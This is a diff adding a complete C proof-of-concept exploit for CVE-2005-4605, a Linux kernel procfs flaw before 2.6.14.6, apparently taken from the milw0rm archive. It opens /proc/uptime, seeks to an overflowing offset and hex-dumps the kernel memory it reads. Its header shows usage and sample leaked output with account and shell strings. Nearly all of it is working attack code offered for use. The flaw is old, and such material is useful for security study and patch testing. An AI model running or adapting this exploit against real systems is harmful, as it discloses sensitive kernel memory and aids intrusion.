@@ -1,0 +1,197 @@
+/* 
+ * cve-2005-4605.c
+ *
+ * Linux Kernel < 2.6.14.6 procfs Kernel Memory Disclosure
+ * Jon Oberheide <jon@oberheide.org>
+ * http://jon.oberheide.org
+ * 
+ * Information:
+ * 
+ *   http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-4605
+ * 
+ *   The procfs code (proc_misc.c) in Linux 2.6.14.3 and other versions before
+ *   2.6.15 allows attackers to read sensitive kernel memory via unspecified 
+ *   vectors in which a signed value is added to an unsigned value. 
+ * 
+ * Usage:
+ *
+ *   $ gcc cve-2005-4605.c -o cve-2005-4605
+ *   $ ./cve-2005-4605
+ *   [+] Opened /proc/uptime.
+ *   [+] Seek to offset 4294963199.
+ *   [+] Read 4096 bytes, dumping to stdout...
+ *   ...
+ *   ... 00 00 00 00 11 00 00 00  ................................
+ *   ... 3a 30 3a 72 6f 6f 74 00  localhost.......root.x.0:0:root.
+ *   ... 0d 00 00 00 dc 91 0f 08  /root./bin/bash.....@...........
+ *   ... bc af 0e 08 00 00 00 00  ............p...................
+ *   ...
+ *
+ * Notes:
+ * 
+ *   This one is _ancient_, but str0ke requested it! ;-) 
+ */
+
+#define _FILE_OFFSET_BITS 64
+#include <stdio.h>
+#include <stdlib.h>
+#include <stdint.h>
+#include <stdbool.h>
+#include <unistd.h>
+#include <string.h>
+#include <inttypes.h>
+#include <limits.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+
+#define DUMP 4096
+#define PROC "/proc/uptime"
+
+#define TYPE_SIGNED(t) (! ((t) 0 < (t) -1))
+#define TYPE_MAX(t) ((t) (! TYPE_SIGNED (t) ? (t) -1 : ~ (~ (t) 0 << (sizeof (t) * CHAR_BIT - 1))))
+
+const char hex_asc[] = "0123456789abcdef";
+#define hex_asc_lo(x) hex_asc[((x) & 0x0f)]
+#define hex_asc_hi(x) hex_asc[((x) & 0xf0) >> 4]
+
+void
+hex_dump_to_buffer(const void *buf, size_t len, int rowsize, int groupsize, char *linebuf, size_t linebuflen, bool ascii)
+{
+	const uint8_t *ptr = buf;
+	uint8_t ch;
+	int j, lx = 0;
+	int ascii_column;
+
+	if (rowsize != 16 && rowsize != 32)
+		rowsize = 16;
+
+	if (!len)
+		goto nil;
+	if (len > rowsize)
+		len = rowsize;
+	if ((len % groupsize) != 0)
+		groupsize = 1;
+
+	switch (groupsize) {
+	case 8: {
+		const uint64_t *ptr8 = buf;
+		int ngroups = len / groupsize;
+
+		for (j = 0; j < ngroups; j++)
+			lx += snprintf(linebuf + lx, linebuflen - lx,
+				"%16.16llx ", (unsigned long long)*(ptr8 + j));
+		ascii_column = 17 * ngroups + 2;
+		break;
+	}
+
+	case 4: {
+		const uint32_t *ptr4 = buf;
+		int ngroups = len / groupsize;
+
+		for (j = 0; j < ngroups; j++)
+			lx += snprintf(linebuf + lx, linebuflen - lx,
+				"%8.8x ", *(ptr4 + j));
+		ascii_column = 9 * ngroups + 2;
+		break;
+	}
+
+	case 2: {
+		const uint16_t *ptr2 = buf;
+		int ngroups = len / groupsize;
+
+		for (j = 0; j < ngroups; j++)
+			lx += snprintf(linebuf + lx, linebuflen - lx,
+				"%4.4x ", *(ptr2 + j));
+		ascii_column = 5 * ngroups + 2;
+		break;
+	}
+
+	default:
+		for (j = 0; (j < rowsize) && (j < len) && (lx + 4) < linebuflen;
+			 j++) {
+			ch = ptr[j];
+			linebuf[lx++] = hex_asc_hi(ch);
+			linebuf[lx++] = hex_asc_lo(ch);
+			linebuf[lx++] = ' ';
+		}
+		ascii_column = 3 * rowsize + 2;
+		break;
+	}
+	if (!ascii)
+		goto nil;
+
+	while (lx < (linebuflen - 1) && lx < (ascii_column - 1))
+		linebuf[lx++] = ' ';
+	for (j = 0; (j < rowsize) && (j < len) && (lx + 2) < linebuflen; j++)
+		linebuf[lx++] = (isascii(ptr[j]) && isprint(ptr[j])) ? ptr[j]
+				: '.';
+nil:
+	linebuf[lx++] = '\0';
+}
+
+void
+print_hex_dump(int rowsize, int groupsize, const void *buf, size_t len, bool ascii)
+{
+	const uint8_t *ptr = buf;
+	int i, linelen, remaining = len;
+	unsigned char linebuf[200];
+
+	if (rowsize != 16 && rowsize != 32)
+		rowsize = 16;
+
+	for (i = 0; i < len; i += rowsize) {
+		linelen = ((remaining) < (rowsize) ? (remaining) : (rowsize));
+		remaining -= rowsize;
+		hex_dump_to_buffer(ptr + i, linelen, rowsize, groupsize,
+		linebuf, sizeof(linebuf), ascii);
+		printf("%s\n", linebuf);
+	}
+}
+
+int
+main(void)
+{
+	int fd, ret;
+	char buf[DUMP];
+	off_t seek, offset=TYPE_MAX(off_t);
+
+	memset(buf, 0, sizeof(buf));
+
+	fd = open(PROC, O_RDONLY);
+	if (fd == -1) {
+		printf("[-] Error during open(2)\n");
+		exit(1);
+	}
+
+	printf("[+] Opened " PROC ".\n");
+
+	seek = lseek(fd, offset-DUMP, SEEK_SET);
+	if (seek == -1) {
+		printf("[-] Error during lseek(2).\n");
+		exit(1);
+	}
+
+	printf("[+] Seek to offset %lld.\n", seek);
+
+	ret = read(fd, buf, DUMP);
+	if (ret == -1) {
+		printf("[-] Error during read(2).\n");
+		exit(1);
+	}
+	
+	if (ret == 0) {
+		printf("[-] read(2) return 0 bytes, your kernel may not be vulnerable.\n");
+		exit(1);
+	}
+
+	printf("[+] Read %d bytes, dumping to stdout...\n\n", ret);
+
+	sleep(3);
+
+	print_hex_dump(32, 1, buf, ret, 1);
+
+	return 0;
+}
+
+// milw0rm.com [2009-08-05]
